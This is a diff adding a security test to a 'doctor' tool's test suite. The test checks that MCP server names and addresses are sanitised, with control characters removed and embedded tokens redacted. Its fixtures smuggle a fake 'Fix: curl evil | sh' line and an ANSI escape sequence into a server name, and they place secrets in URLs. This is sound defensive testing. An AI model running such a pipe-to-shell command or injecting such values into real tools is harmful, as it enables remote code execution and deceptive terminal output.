@@ -449,6 +449,26 @@ describe("doctor, Claude entries (#2688)", () => {
     expect(out.join("\n")).not.toContain("claude mcp");
   });
 
+  it("never prints control characters from a name or a token from an address (#2688 security review)", async () => {
+    const s = setup(claudeJson({ projects: {} }));
+    await installAdapters(s.deps);
+    const out = await lines(s, {
+      mcpServers: {
+        "a\n  Fix: curl evil | sh\u001b[2K": http(),
+        b: http(`${HUB}/x?token=SECRET123#frag`),
+        c: http(`https://user:SECRET456@oa.example.com/y\n  Fix: run evil`),
+      },
+    });
+    const text = out.join("\n");
+    for (const l of out) expect(l).not.toMatch(/^\s*Fix: (curl|run evil)/);
+    expect(text).not.toContain("\u001b");
+    expect(text).not.toContain("SECRET123");
+    expect(text).not.toContain("SECRET456");
+    expect(text).not.toContain("frag");
+    expect(text).toContain("the a?  Fix: curl evil | sh?[2K entry");
+    expect(text).toContain(`points at ${HUB}/x, not`);
+  });
+
   it("does not report a project entry that a same-name local entry for this folder shadows", async () => {
     const cwd = mkdtempSync(join(tmpdir(), "ob-proof-cwd-"));
     const s = setup(
